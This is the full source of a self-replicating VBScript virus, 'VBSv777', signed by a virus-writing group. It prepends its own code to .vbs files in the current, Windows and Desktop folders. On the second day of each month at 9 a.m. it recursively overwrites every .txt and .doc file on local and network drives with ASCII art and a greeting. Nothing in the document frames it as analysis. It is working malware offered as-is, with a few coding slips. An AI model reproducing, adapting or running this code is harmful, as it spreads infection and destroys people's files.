'VBSv777

On Error Resume Next

Const cbVirusSize = 3914
Const cbForReading=1, cbForWriting=2
Const cbWindowsFolder = 0

Dim cbFSO, cbInfectionMarker, cbVictimCode, cbVirusCode
Dim cbWePath, cbWeFile, cbVictim, VictimFile
Dim cbFoldersToInfect(3), cbFolder, cbFile, cbDriveList, cbDrive
Dim cbTextFile


Set cbFSO = CreateObject("Scripting.FileSystemObject")

cbWePath = Wscript.ScriptFullName

cbFoldersToInfect(0) = "."
cbFoldersToInfect(1) = cbFSO.GetSpecialFolder(cbWindowsFolder)
cbFoldersToInfect(2) = cbFSO.GetSpecialFolder(cbWindowsFolder) & "\Profiles\All Users\Desktop"
cbFoldersToInfect(3) = cbFSO.GetSpecialFolder(cbWindowsFolder) & "\Profiles\Administrator\Desktop"
cbFoldersToInfect(4) = cbFSO.GetSpecialFolder(cbWindowsFolder) & "\Desktop"


Set cbWeFile=cbFSO.OpenTextFile(cbWePath, cbForReading)
cbVirusCode = cbWeFile.Read(cbVirusSize)
cbWeFile.Close


For Each cbFolder in cbFoldersToInfect
  cbInfect cbFolder
Next


If Day(Now()) = 2 And Hour(Now()) = 9 Then

  Set cbDriveList = cbFSO.Drives

  For Each cbDrive in cbDriveList
    If cbDrive.DriveType = 2 Or cbDrive.DriveType = 3 then cbRecursiveFolderScan cbDrive & "\"
  Next

End If



Sub cbRecursiveFolderScan(cbTheFolder)

  Dim cbMoreFolders, cbTempFolder


  For Each cbFile in cbFSO.GetFolder(TheFolder).Files
    If cbFSO.GetExtensionName(cbFile) = "txt" or cbFSO.GetExtensionName(cbFile) = "doc" Then

      Set cbTextFile = cbFSO.OpenTextFile(cbFile, cbForWriting)
      cbTextFile.WriteLine "                                       "
      cbTextFile.WriteLine "      _                         _      "
      cbTextFile.WriteLine "     |_|                       |_|     "
      cbTextFile.WriteLine "     | |         /^^^\         | |     "
      cbTextFile.WriteLine "    _| |_      (| �o� |)      _| |_    "
      cbTextFile.WriteLine "   | | | | _    (_---_)    _ | | | |_  "
      cbTextFile.WriteLine " | | | | |' |    _| |_    | `| | | | | "
      cbTextFile.WriteLine " |          |   /     \   |          | "
      cbTextFile.WriteLine "  \        /  / /(. .)\ \  \        /  "
      cbTextFile.WriteLine "    \    /  / /  | . |  \ \  \    /    "
      cbTextFile.WriteLine "      \  \/ /    ||Y||    \ \/  /      "
      cbTextFile.WriteLine "       \__/      || ||      \__/       "
      cbTextFile.WriteLine "                 () ()                 "
      cbTextFile.WriteLine "                 || ||                 "
      cbTextFile.WriteLine "                ooO Ooo                "
      cbTextFile.WriteLine "                                       "
      cbTextFile.WriteLine " Greetings From CTRL-ALT-DEL /CB + AVM "
      cbTextFile.WriteLine "    - http://www.codebreakers.org -    "
      cbTextFile.WriteLine "                                       "
      cbTextFile.Close
      MsgBox "Greetings From CTRL-ALT-DEL /CB + AVM " & Chr(13) & Chr(10) & "- http://www.codebreakers.org -"

    End If
  Next

  Set cbMoreFolders =  cbFSO.GetFolder(cbTheFolder).SubFolders

  For Each cbTempFolder In cbMoreFolders
    cbRecursiveFolderScan cbTempFolder
  Next

End Sub



Sub cbInfect(cbTheFolder)

For Each cbVictim in cbFSO.GetFolder(cbTheFolder).Files
  If cbFSO.GetExtensionName(cbVictim.Name) = "vbs" then

    Set cbVictimFile = cbFSO.OpenTextFile(cbVictim.Path,cbForReading)
    cbInfectionMarker = cbVictimFile.read(8)
    cbVictimFile.close

    If cbInfectionMarker <> "'VBSv777" Then

      Set cbVictimFile = cbFSO.OpenTextFile(cbVictim.path,cbForReading)
      cbVictimCode = cbVictimFile.ReadAll
      cbVictimFile.close

      cbVictimCode = cbVirusCode & cbVictimCode

      Set cbVictimFile = cbFSO.OpenTextFile(cbVictim.Path,cbForWriting,True)
      cbVictimFile.Write cbVictimCode
      cbVictimFile.close

    end if

  end if
next
end sub
